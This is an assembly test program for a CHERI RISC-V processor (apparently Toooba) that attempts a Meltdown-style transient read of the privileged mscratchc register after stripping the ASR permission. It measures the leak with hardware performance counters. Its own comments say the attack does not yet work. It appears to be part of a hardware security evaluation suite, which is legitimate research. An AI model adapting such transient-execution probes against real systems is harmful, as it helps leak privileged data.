#include "../s_sources/hpm_macros.h"

.text

/*
Meltdown-GP CHERI Variant
Author: Franz Fuchs
This variant of Meltdown attempts to transiently read out the
content of the SCR mscratch. Please note that this version does not
work yet. I assume that this will not be possible on Toooba
as the rights are checked before any side effects could
take place.

steps:
1. init mscratchc
2. jump to PCC with ASR permission bit stripped
3. access SCR and transiently reveal its value
*/

start:

  // initialise mscratchc
  cspecialr ct0, ddc
  li t1, 0x100
  csetaddr ct0, ct0, t1
  cspecialw mscratchc, ct0

  // set pcc flags such that capability encoding
  // mode is used
  // This is described in the CHERI Specification v7
  // in Section 5.3.6 
  cspecialr ct3, pcc
  li t1, 1
  csetflags ct3, ct3, t1
#ifdef VCU_118
  li  t2, 0xc000002a
#else
  li  t2, 0x8000002a
#endif
  csetoffset  ct3, ct3, t2
  cjr ct3

init_hpm:
  // set up trap_handler
  cllc ct2, trap_handler
  cspecialw mtcc, ct2

  // prepare hardware performance monitoring
  // do counting of load request sent by the CPU
  HPM_SELECT_EVENT(3, 0x30)
  // read value of counter 3 and store it to s10
  HPM_M_READ_X (s10, 3)

disable_asr:
  // no ASR permission
  cspecialr ct3, pcc
#ifdef VCU_118
  li t2, 0xc0000062
#else
  li t2, 0x80000062
#endif
  csetoffset ct3, ct3, t2
  li t1, (1<<10)
  not t1, t1
  candperm ct3, ct3, t1
  cjr ct3

init_caps:

#ifdef VCU_118
  // cs1 is a capability to [0xc0001000 - 0xc0002000]
  li  t2, 0xc0001000
  cfromptr cs1, ddc, t2
  li t1, 0x1000
  csetbounds cs1, cs1, t1
#else
  // cs1 is a capability to [0x80001000 - 0x80002000]
  li  t2, 0x80001000
  cfromptr cs1, ddc, t2
  li t1, 0x1000
  csetbounds cs1, cs1, t1
#endif

melt_cheri_gp:

  // access scratch capability and load based on it
  cspecialr cs2, mscratchc
  cgetaddr t0, cs2
  cincoffset cs1, cs1, t0
  cld t1, 0(cs1)

  .rept 0x20
  nop
  .endr


trap_handler:
  HPM_M_READ_X (s11, 3)

  // we expect 1 loads to have happened
  // one transient loads in melt_cheri_gp, which
  // leaks the secret
  HPM_CAP_TEST(s10, s11, 1)

.section .tohost , "adw"

tohost:
  .dword 0x0000000000000000
